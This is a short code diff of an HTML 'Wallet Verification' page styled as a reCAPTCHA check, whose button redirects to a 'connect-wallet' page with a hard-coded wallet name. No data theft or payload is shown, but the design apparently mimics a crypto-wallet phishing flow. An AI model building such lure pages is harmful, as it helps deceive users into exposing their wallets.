@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Wallet Verification</title>
-  <link rel="stylesheet" href="wcn.css" />
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body class="recaptcha-body">
   <div class="recaptcha-container">
@@ -24,9 +24,10 @@
 <!-- Inside <script> tag or in JS file -->
 <script>
   document.querySelector('.verify-btn').addEventListener('click', () => {
-    const selectedWallet = localStorage.getItem('selectedWallet') || 'UnknownWallet';
+    // Simulate short delay before redirect
     setTimeout(() => {
-      window.location.href = `connect-wallet.html?wallet=${encodeURIComponent(selectedWallet)}`;
+      // Replace "Metamask" with the dynamic wallet name if you're passing it via URL
+      window.location.href = "connect-wallet.html?wallet=Metamask";
     }, 1000);
   });
 </script>
